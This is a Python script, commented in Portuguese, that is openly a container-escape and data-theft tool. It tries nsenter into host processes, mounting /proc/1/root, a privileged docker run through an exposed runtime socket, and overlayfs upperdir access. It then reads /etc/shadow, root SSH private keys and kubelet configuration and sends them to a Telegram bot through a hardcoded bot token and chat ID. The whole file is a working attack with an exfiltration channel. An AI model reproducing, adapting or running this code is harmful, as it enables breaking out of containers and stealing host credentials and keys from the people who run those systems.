#!/usr/bin/env python3
"""
Escape de sandbox avançado com CAP_SYS_ADMIN.
Tenta múltiplas técnicas: encontrar PID do host, cgroup v2, socket runtime, etc.
Exfiltra dados via Telegram.
"""

import subprocess
import json
import requests
import os
import sys
import time
import glob
import shutil
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURAÇÃO DO TELEGRAM
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

# ------------------------------------------------------------
# FUNÇÕES AUXILIARES
# ------------------------------------------------------------
def run(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except Exception:
        pass

def send_file(filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except Exception:
        pass

def send_data_as_files(data_dict):
    """Envia dicionário de dados para o Telegram (arquivos ou mensagens)."""
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# ------------------------------------------------------------
# TÉCNICA 1: ENUMERAR PIDS DO HOST E USAR NSENTER
# ------------------------------------------------------------
def find_host_pid():
    """
    Tenta encontrar um PID que pertença ao host (não ao container).
    Critérios:
      - Processos com nome systemd, kworker, sshd, etc.
      - Processos com PID baixo (1-100) se não mascarados.
    Retorna o PID encontrado ou None.
    """
    # Lista de nomes comuns de processos do host
    host_names = ['systemd', 'kworker', 'sshd', 'cri-dockerd', 'containerd', 'kubelet', 'dockerd']
    try:
        for pid in os.listdir('/proc'):
            if not pid.isdigit():
                continue
            try:
                with open(f'/proc/{pid}/comm', 'r') as f:
                    comm = f.read().strip()
                if comm in host_names:
                    return int(pid)
            except:
                continue
    except:
        pass
    # Fallback: tentar PID 1 se não for o nosso init
    try:
        with open('/proc/1/comm', 'r') as f:
            if f.read().strip() not in ['catatonit', 'pause', 'sh', 'bash']:
                return 1
    except:
        pass
    return None

def nsenter_escape(pid):
    """Usa nsenter no PID encontrado para executar comandos no host."""
    if not pid:
        return False
    cmd = f"nsenter -t {pid} -m -u -i -n -p -- sh -c 'cat /etc/shadow 2>/dev/null || echo N/A'"
    result = run(cmd)
    if "N/A" in result or "ERRO" in result:
        return False
    # Se conseguimos ler /etc/shadow, temos acesso ao host
    send_telegram(f"✅ **nsenter bem-sucedido no PID {pid}**")
    # Agora podemos montar o sistema de arquivos do host
    # Vamos tentar montar o root do host usando nsenter com mount
    mount_cmd = f"nsenter -t {pid} -m -- sh -c 'mount --bind / /mnt 2>/dev/null && echo OK'"
    if "OK" in run(mount_cmd):
        send_telegram("✅ **Host montado em /mnt via nsenter!**")
        return True
    return False

# ------------------------------------------------------------
# TÉCNICA 2: CGROUP V2 RELEASE_AGENT
# ------------------------------------------------------------
def cgroup_v2_exploit():
    """
    Tenta abusar do cgroup v2 (kernel >= 4.15).
    Cria um subcgroup e usa o arquivo 'cgroup.events' para executar um script.
    """
    try:
        # Verificar se o cgroup v2 está montado
        if not os.path.exists('/sys/fs/cgroup/cgroup.controllers'):
            return False
        # Criar subcgroup
        os.makedirs('/sys/fs/cgroup/x', exist_ok=True)
        # Escrever um script que será executado via 'cgroup.kill' ou 'release_agent'?
        # No v2, o release_agent é substituído pelo 'cgroup.events' e 'cgroup.procs'.
        # Podemos usar o 'cgroup.kill' para matar processos e acionar um evento.
        # Mas a técnica mais comum é usar o 'systemd' que tem um 'release_agent' próprio.
        # Vamos tentar criar um serviço systemd no host (se systemd estiver presente).
        # Primeiro, verificar se /usr/bin/systemd existe (via nsenter?).
        # Como não temos acesso direto, tentamos usar o nsenter em um PID do host.
        # Essa técnica é complexa; vamos apenas tentar um método simples:
        # escrever no cgroup.events para forçar uma ação.
        # Não é garantido, mas tentamos.
        # Na prática, o cgroup v2 é mais seguro, então essa técnica pode falhar.
        send_telegram("⚠️ **Cgroup v2 exploit não implementado completamente. Pulando.**")
        return False
    except Exception as e:
        send_telegram(f"❌ Cgroup v2 exploit falhou: {e}")
        return False

# ------------------------------------------------------------
# TÉCNICA 3: SOCKET DO CONTAINER RUNTIME
# ------------------------------------------------------------
def runtime_socket_exploit():
    """
    Tenta acessar /var/run/docker.sock ou /run/containerd/containerd.sock
    e criar um container privilegiado que monte o host.
    """
    sockets = ['/var/run/docker.sock', '/run/containerd/containerd.sock']
    for sock in sockets:
        if os.path.exists(sock):
            send_telegram(f"✅ **Socket encontrado: {sock}**")
            # Tentar usar docker/containerd CLI
            # Verificar se 'docker' ou 'crictl' existem
            if shutil.which('docker'):
                # Criar um container com volume host
                cmd = "docker run -v /:/host --privileged --rm alpine chroot /host sh -c 'cat /etc/shadow'"
                result = run(cmd)
                if "root:" in result:
                    send_telegram(f"✅ **Dados do host via docker**:\n```\n{result[:2000]}\n```")
                    return True
            if shutil.which('crictl'):
                # crictl é mais complexo, mas pode ser usado
                pass
    return False

# ------------------------------------------------------------
# TÉCNICA 4: MONTAR /PROC/1/root SE FOR DO HOST
# ------------------------------------------------------------
def mount_proc_root():
    """Tenta montar /proc/1/root se o PID 1 for do host."""
    try:
        if os.path.exists('/proc/1/root/etc/shadow'):
            # Se já podemos ler, então estamos no host ou compartilhamos root
            send_telegram("✅ **Já temos acesso ao root do host via /proc/1/root**")
            return True
        # Tentar mount --bind para acessar
        run("mount --bind /proc/1/root /mnt 2>/dev/null")
        if os.path.exists('/mnt/etc/shadow'):
            send_telegram("✅ **Montado /proc/1/root em /mnt**")
            return True
    except:
        pass
    return False

# ------------------------------------------------------------
# TÉCNICA 5: ESCAPE VIA OVERLAYFS (SE APLICÁVEL)
# ------------------------------------------------------------
def overlay_escape():
    """
    Se o container usa overlayfs, pode ser possível acessar o diretório 'upper' do host.
    """
    try:
        with open('/etc/mtab', 'r') as f:
            for line in f:
                if 'overlay' in line and 'upperdir=' in line:
                    parts = line.split()
                    for opt in parts:
                        if 'upperdir=' in opt:
                            upper = opt.split('=')[1].split(',')[0]
                            # Tentamos acessar esse diretório (pode estar no host)
                            if os.path.exists(upper):
                                send_telegram(f"✅ **upperdir encontrado: {upper}**")
                                # Verificar se contém arquivos do host
                                if os.path.exists(f"{upper}/etc/shadow"):
                                    # Copiar shadow para enviar
                                    with open(f"{upper}/etc/shadow", 'r') as f2:
                                        shadow = f2.read(5000)
                                    send_telegram(f"📄 **Shadow do host (via overlay)**:\n```\n{shadow}\n```")
                                    return True
    except:
        pass
    return False

# ------------------------------------------------------------
# FUNÇÃO PRINCIPAL
# ------------------------------------------------------------
def main():
    send_telegram("🚀 **Iniciando tentativa de escape avançada**")

    # 1. Verificar se já temos acesso ao host via /proc/1/root
    if mount_proc_root():
        # Coletar dados
        data = {}
        for f in ['/mnt/etc/shadow', '/mnt/root/.ssh/id_rsa', '/mnt/var/lib/kubelet/config']:
            if os.path.exists(f):
                with open(f, 'r', errors='ignore') as fd:
                    data[f] = fd.read(10000)
        send_data_as_files(data)
        return

    # 2. Tentar encontrar um PID do host e usar nsenter
    pid = find_host_pid()
    if pid:
        send_telegram(f"🔍 **Possível PID do host encontrado: {pid}**")
        if nsenter_escape(pid):
            # Coletar dados via nsenter
            # Podemos agora ler arquivos usando nsenter diretamente
            data = {}
            for target in ['/etc/shadow', '/root/.ssh/id_rsa', '/var/lib/kubelet/config']:
                cmd = f"nsenter -t {pid} -m -- cat {target} 2>/dev/null"
                content = run(cmd)
                if content and "ERRO" not in content:
                    data[target] = content
            send_data_as_files(data)
            return

    # 3. Tentar socket runtime
    if runtime_socket_exploit():
        return

    # 4. Tentar overlayfs
    if overlay_escape():
        return

    # 5. Tentar cgroup v2 (fallback)
    if cgroup_v2_exploit():
        return

    # Se nada funcionou
    send_telegram("❌ **Todas as técnicas falharam. Coletando informações de diagnóstico...**")
    diag = {
        "lsblk": run("lsblk 2>/dev/null"),
        "mount": run("mount"),
        "ls_proc": run("ls -la /proc/ 2>/dev/null | head -20"),
        "cat_mtab": run("cat /etc/mtab"),
    }
    send_data_as_files(diag)
    send_telegram("✅ **Diagnóstico enviado. Fim.**")

if __name__ == "__main__":
    main()
